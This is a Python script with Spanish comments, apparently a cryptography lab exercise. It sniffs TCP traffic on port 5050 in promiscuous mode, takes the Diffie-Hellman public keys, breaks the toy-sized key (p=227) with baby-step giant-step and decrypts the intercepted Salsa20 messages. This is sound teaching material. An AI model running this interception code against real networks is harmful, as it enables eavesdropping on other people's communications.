import socket
import struct
from math import isqrt
from Crypto.Cipher import Salsa20
import hashlib

# Variables globales
client_public_key = None
server_public_key = None
p = 227  # Modificar con el valor de p usado en el intercambio de llaves Diffie-Hellman
g = 12   # Modificar con el valor de g usado en el intercambio de llaves Diffie-Hellman
shared_secret = None

# Implementación del ataque de "pasos de bebé, pasos de gigante"
def baby_step_giant_step(g, p, y):
    m = isqrt(p) + 1

    # Baby step
    print("[ATAQUE] Iniciando paso de bebé:")
    baby_steps = {}
    for j in range(m):
        baby_step_value = pow(g, j, p)
        baby_steps[baby_step_value] = j
        print(f"  [PASO BEBÉ] g^{j} [congruente] {baby_step_value} (mod {p})")

    # Giant step
    print("[ATAQUE] Iniciando paso de gigante:")
    g_inv_m = pow(g, -m, p)
    giant_step_value = y

    for i in range(m):
        print(f"  [PASO GIGANTE] Iteración {i}, g^-m^{i} * y [congruente] {giant_step_value} (mod {p})")
        if giant_step_value in baby_steps:
            x = i * m + baby_steps[giant_step_value]
            print(f"  [ÉXITO] Se encontró la clave privada: x = {x}")
            return x
        giant_step_value = (giant_step_value * g_inv_m) % p

    print("[ERROR] No se pudo encontrar la clave privada.")
    return None

# Derivar una clave simétrica a partir del secreto compartido usando SHA-256
def derive_symmetric_key(shared_secret):
    shared_secret_bytes = str(shared_secret).encode('utf-8')
    symmetric_key = hashlib.sha256(shared_secret_bytes).digest()  # 32 bytes
    return symmetric_key

# Inicia el sniffer para capturar los paquetes de la red
def start_sniffer():
    global client_public_key, server_public_key, shared_secret

    # Configura el socket para capturar paquetes en la red
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)

    # Asigna la interfaz local donde se desea capturar
    sniffer.bind(('192.168.20.29', 0))  # Cambia por la dirección IP local del sniffer

    # Coloca la tarjeta de red en modo promiscuo
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Para Windows, es necesario activar el modo promiscuo para poder capturar paquetes
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    print("[SNIFFER] Iniciando captura de paquetes...")

    # Captura paquetes indefinidamente
    try:
        while True:
            # Recibe los datos del paquete
            raw_data, addr = sniffer.recvfrom(65565)

            # Obtener la cabecera IP (los primeros 20 bytes)
            ip_header = raw_data[:20]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

            # Obtener el protocolo (campo 6 de la cabecera IP)
            protocol = iph[6]
            if protocol == 6:  # Protocolo TCP
                # Extraer la cabecera TCP (20 bytes después de la cabecera IP)
                tcp_header = raw_data[20:40]
                tcph = struct.unpack('!HHLLBBHHH', tcp_header)

                # Extraer los puertos origen y destino
                src_port = tcph[0]
                dst_port = tcph[1]

                # Filtrar por puerto 5050
                if src_port == 5050 or dst_port == 5050:
                    # Extraer los datos del paquete después de la cabecera TCP
                    data_offset = (tcph[4] >> 4) * 4
                    payload = raw_data[20 + data_offset:]

                    # Verificar si el payload contiene datos
                    if payload and len(payload) > 0:
                        try:
                            # Interceptar las claves públicas del intercambio Diffie-Hellman
                            if client_public_key is None:
                                client_public_key = int(payload.decode('utf-8'))
                                print(f"[CLAVE PÚBLICA CLIENTE INTERCEPTADA]: {client_public_key}")

                            elif server_public_key is None:
                                server_public_key = int(payload.decode('utf-8'))
                                print(f"[CLAVE PÚBLICA SERVIDOR INTERCEPTADA]: {server_public_key}")

                                # Inicia el ataque de "pasos de bebé, pasos de gigante"
                                attacker_private_key = baby_step_giant_step(g, p, server_public_key)
                                print(f"[CLAVE PRIVADA ATACANTE (CALCULADA)]: {attacker_private_key}")

                                if attacker_private_key is not None:
                                    shared_secret = pow(client_public_key, attacker_private_key, p)
                                    print(f"[SECRETO COMPARTIDO CALCULADO]: {shared_secret}")
                                    derived_key = derive_symmetric_key(shared_secret)
                                    print(f"[CLAVE SIMÉTRICA DERIVADA]: {derived_key.hex()}")

                            elif shared_secret and len(payload) > 8:
                                # Interceptar nonce de los primeros 8 bytes del mensaje cifrado
                                nonce = payload[:8]
                                encrypted_message = payload[8:]

                                print(f"[NONCE INTERCEPTADO]: {nonce.hex()}")
                                print(f"[MENSAJE CIFRADO INTERCEPTADO]: {encrypted_message.hex()}")

                                # Intentar descifrar el mensaje usando la clave derivada
                                try:
                                    cipher = Salsa20.new(key=derived_key, nonce=nonce)
                                    decrypted_message = cipher.decrypt(encrypted_message)
                                    
                                    # Verificar si es posible decodificar como UTF-8
                                    try:
                                        print(f"[MENSAJE DESCIFRADO]: {decrypted_message.decode('utf-8')}")
                                    except UnicodeDecodeError:
                                        print(f"[MENSAJE DESCIFRADO (RAW)]: {decrypted_message.hex()}")
                                except Exception as e:
                                    print(f"[ERROR DESCIFRADO]: {str(e)}")

                        except ValueError as e:
                            print(f"[ERROR] No se pudo convertir el payload a entero: {e}")

    except KeyboardInterrupt:
        print("[SNIFFER] Deteniendo captura de paquetes.")
        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)

if __name__ == "__main__":
    start_sniffer()
